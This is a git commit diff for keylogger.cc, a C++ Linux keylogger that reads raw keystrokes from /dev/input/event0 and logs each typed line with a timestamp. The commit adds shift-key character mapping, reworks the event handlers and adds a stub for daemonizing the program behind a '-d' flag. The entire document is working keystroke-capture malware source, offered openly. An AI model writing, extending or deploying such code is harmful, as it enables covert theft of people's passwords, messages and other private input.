ed8f8b6f670bd4c0c6d246dba357b72099405618
André L. C. Moreira <alcm99@gmail.com>
2021-01-31 02:37:52 -0300

    adding support for shift key

--- keylogger.cc
+++ keylogger.cc
@@ -1,4 +1,5 @@
 #include <chrono>
+#include <cstring>
 #include <ctime>
 #include <fstream>
 #include <iostream>
@@ -12,14 +13,16 @@
 
 struct keylogger_ctx {
     bool is_capslock_on;
+    bool is_shitf_pressed;
     std::string kb_file;
     std::vector<char> kb_buffer;
     int buffer_cursor;
-    char current_key;
+    struct input_event event;
 };
 
 struct key_event_handler {
     char key_char;
+    char key_char_shift;
     void (*cb)(struct keylogger_ctx *);
 };
 
@@ -29,64 +32,95 @@ void handle_backspace(struct keylogger_ctx *);
 void handle_capslock(struct keylogger_ctx *);
 void handle_delete(struct keylogger_ctx *);
 void handle_arrow(struct keylogger_ctx *);
+void handle_shift(struct keylogger_ctx *);
 
 static const std::map<int, struct key_event_handler> handlers{
-    { KEY_0, { '0', handle_key } },
-    { KEY_1, { '1', handle_key } },
-    { KEY_2, { '2', handle_key } },
-    { KEY_3, { '3', handle_key } },
-    { KEY_4, { '4', handle_key } },
-    { KEY_5, { '5', handle_key } },
-    { KEY_6, { '6', handle_key } },
-    { KEY_7, { '7', handle_key } },
-    { KEY_8, { '8', handle_key } },
-    { KEY_9, { '9', handle_key } },
-    { KEY_A, { 'a', handle_key } },
-    { KEY_B, { 'b', handle_key } },
-    { KEY_C, { 'c', handle_key } },
-    { KEY_D, { 'd', handle_key } },
-    { KEY_E, { 'e', handle_key } },
-    { KEY_F, { 'f', handle_key } },
-    { KEY_G, { 'g', handle_key } },
-    { KEY_H, { 'h', handle_key } },
-    { KEY_I, { 'i', handle_key } },
-    { KEY_J, { 'j', handle_key } },
-    { KEY_K, { 'k', handle_key } },
-    { KEY_L, { 'l', handle_key } },
-    { KEY_M, { 'm', handle_key } },
-    { KEY_N, { 'n', handle_key } },
-    { KEY_O, { 'o', handle_key } },
-    { KEY_P, { 'p', handle_key } },
-    { KEY_Q, { 'q', handle_key } },
-    { KEY_R, { 'r', handle_key } },
-    { KEY_S, { 's', handle_key } },
-    { KEY_T, { 't', handle_key } },
-    { KEY_U, { 'u', handle_key } },
-    { KEY_V, { 'v', handle_key } },
-    { KEY_W, { 'w', handle_key } },
-    { KEY_X, { 'x', handle_key } },
-    { KEY_Y, { 'y', handle_key } },
-    { KEY_Z, { 'z', handle_key } },
-    { KEY_COMMA, { ',', handle_key } },
-    { KEY_DOT, { '.', handle_key } },
-    { KEY_MINUS, { '-', handle_key } },
-    { KEY_SEMICOLON, { ';', handle_key } },
-    { KEY_EQUAL, { '=', handle_key } },
-    { KEY_SPACE, { ' ', handle_key } },
-    { KEY_ENTER, { '\0', handle_enter } },
-    { KEY_BACKSPACE, { '\0', handle_backspace } },
-    { KEY_CAPSLOCK, { '\0', handle_capslock } },
-    { KEY_DELETE, { '\0', handle_delete } },
-    { KEY_RIGHT, { '\0', handle_arrow } },
-    { KEY_LEFT, { '\0', handle_arrow } }
+    { KEY_0, { '0', ')', handle_key } },
+    { KEY_1, { '1', '!', handle_key } },
+    { KEY_2, { '2', '@', handle_key } },
+    { KEY_3, { '3', '#', handle_key } },
+    { KEY_4, { '4', '$', handle_key } },
+    { KEY_5, { '5', '%', handle_key } },
+    { KEY_6, { '6', '\0', handle_key } }, // TODO
+    { KEY_7, { '7', '&', handle_key } },
+    { KEY_8, { '8', '*', handle_key } },
+    { KEY_9, { '9', '(', handle_key } },
+    { KEY_A, { 'a', 'A', handle_key } },
+    { KEY_B, { 'b', 'B', handle_key } },
+    { KEY_C, { 'c', 'C', handle_key } },
+    { KEY_D, { 'd', 'D', handle_key } },
+    { KEY_E, { 'e', 'E', handle_key } },
+    { KEY_F, { 'f', 'F', handle_key } },
+    { KEY_G, { 'g', 'G', handle_key } },
+    { KEY_H, { 'h', 'H', handle_key } },
+    { KEY_I, { 'i', 'I', handle_key } },
+    { KEY_J, { 'j', 'J', handle_key } },
+    { KEY_K, { 'k', 'K', handle_key } },
+    { KEY_L, { 'l', 'L', handle_key } },
+    { KEY_M, { 'm', 'M', handle_key } },
+    { KEY_N, { 'n', 'N', handle_key } },
+    { KEY_O, { 'o', 'O', handle_key } },
+    { KEY_P, { 'p', 'P', handle_key } },
+    { KEY_Q, { 'q', 'Q', handle_key } },
+    { KEY_R, { 'r', 'R', handle_key } },
+    { KEY_S, { 's', 'S', handle_key } },
+    { KEY_T, { 't', 'T', handle_key } },
+    { KEY_U, { 'u', 'U', handle_key } },
+    { KEY_V, { 'v', 'V', handle_key } },
+    { KEY_W, { 'w', 'W', handle_key } },
+    { KEY_X, { 'x', 'X', handle_key } },
+    { KEY_Y, { 'y', 'Y', handle_key } },
+    { KEY_Z, { 'z', 'Z', handle_key } },
+    { KEY_COMMA, { ',', '<', handle_key } },
+    { KEY_DOT, { '.', '>', handle_key } },
+    { KEY_MINUS, { '-', '_', handle_key } },
+    { KEY_SEMICOLON, { ';', ':', handle_key } },
+    { KEY_EQUAL, { '=', '+', handle_key } },
+    { KEY_SPACE, { ' ', '\0', handle_key } },
+    { KEY_ENTER, { '\0', '\0', handle_enter } },
+    { KEY_BACKSPACE, { '\0', '\0', handle_backspace } },
+    { KEY_CAPSLOCK, { '\0', '\0', handle_capslock } },
+    { KEY_DELETE, { '\0', '\0', handle_delete } },
+    { KEY_RIGHT, { '\0', '\0', handle_arrow } },
+    { KEY_LEFT, { '\0', '\0', handle_arrow } },
+    { KEY_LEFTSHIFT, { '\0', '\0', handle_shift } }
 };
+
+std::vector<std::string> get_keyboard_files()
+{
+    //std::ifstream file{"/proc/bus/input/devices"};
+    std::vector<std::string> list;
+    //std::vector<std::string> content;
+    //std::string line;
+
+    //for (int i = 0; std::getline(file, line); i++) {
+    //    if (!line.compare("")) {
+    //        for (auto &line : content) {
+    //            if (line.find("EV=120013")) {
+
+    //            }
+
+    //        }
+    //    } else {
+    //        content.emplace_back(line);
+    //    }
+    //}
+
+    return list;
+}
 
 void handle_key(struct keylogger_ctx *ctx)
 {
-    auto key_char = handlers.at(ctx->current_key).key_char;
+    if (!ctx->event.value) {
+        return;
+    }
 
-    // TODO: improve
-    if (ctx->is_capslock_on) {
+    auto key_code = ctx->event.code;
+    auto key_char = ctx->is_shitf_pressed
+        ? handlers.at(key_code).key_char_shift
+        : handlers.at(key_code).key_char;
+
+    if (ctx->is_capslock_on && (key_char >= 'a' || key_char <= 'z')) {
         key_char -= 32;
     }
 
@@ -94,13 +128,15 @@ void handle_key(struct keylogger_ctx *ctx)
         ctx->kb_buffer.begin() + ctx->buffer_cursor++,
         key_char
     );
-
-    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
 }
 
 void handle_enter(struct keylogger_ctx *ctx)
 {
-    char date[11] = {0}, timestamp[9] = {0};
+    char date[11], timestamp[9];
+
+    if (!ctx->event.value) {
+        return;
+    }
 
     {
         auto now = std::chrono::system_clock::to_time_t(
@@ -131,43 +167,62 @@ void handle_enter(struct keylogger_ctx *ctx)
 
     ctx->kb_buffer.clear();
     ctx->buffer_cursor = 0;
-    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
 }
 
 void handle_capslock(struct keylogger_ctx *ctx)
 {
+    if (!ctx->event.value) {
+        return;
+    }
+
     ctx->is_capslock_on = !ctx->is_capslock_on;
-    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
+}
+
+void handle_shift(struct keylogger_ctx *ctx)
+{
+    ctx->is_shitf_pressed = ctx->event.value;
 }
 
 void handle_delete(struct keylogger_ctx *ctx)
 {
-    std::cout << "cursor " << ctx->buffer_cursor << std::endl;
-    std::cout << "size " << ctx->kb_buffer.size() << std::endl;
+    if (!ctx->event.value) {
+        return;
+    }
+
     if (ctx->buffer_cursor < ctx->kb_buffer.size()) {
         ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
     }
-
-    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
 }
 
 void handle_backspace(struct keylogger_ctx *ctx)
 {
+    if (!ctx->event.value) {
+        return;
+    }
+
     if (!ctx->kb_buffer.empty()) {
         ctx->kb_buffer.erase(
             ctx->kb_buffer.begin() + (--ctx->buffer_cursor)
         );
     }
-
-    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
 }
 
 void handle_arrow(struct keylogger_ctx *ctx)
 {
-    ctx->buffer_cursor = (ctx->current_key == KEY_LEFT)
+    if (!ctx->event.value) {
+        return;
+    }
+
+    auto current_key = ctx->event.code;
+
+    ctx->buffer_cursor = (current_key == KEY_LEFT)
         ? (ctx->buffer_cursor - 1)
         : (ctx->buffer_cursor + 1);
-    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
+}
+
+void deamonize()
+{
+
 }
 
 int main(int argc, char *argv[])
@@ -175,9 +230,13 @@ int main(int argc, char *argv[])
     struct input_event ev;
     struct keylogger_ctx ctx = {
         .is_capslock_on = false,
-        .kb_file = "/dev/input/event0", // TODO: is this correct?
+        .kb_file = "/dev/input/event0", // TODO
         .buffer_cursor = 0
     };
+
+    if (argc > 1 && !std::strcmp(argv[1], "-d")) {
+        deamonize();
+    }
 
     {
         std::ifstream kb_file{ctx.kb_file};
@@ -185,14 +244,11 @@ int main(int argc, char *argv[])
         while (1) {
             kb_file.read((char *)&ev, sizeof(struct input_event));
 
-            // TODO: delete
-            // TODO: tab
-            // TODO: capslock
-            if (ev.type == EV_KEY && ev.value) {
+            if (ev.type == EV_KEY) {
                 try {
                     auto ev_handler = handlers.at(ev.code);
 
-                    ctx.current_key = ev.code;
+                    ctx.event = ev;
                     ev_handler.cb(&ctx);
                 } catch (...) {
                     std::cout << "no event handler for key " << ev.code
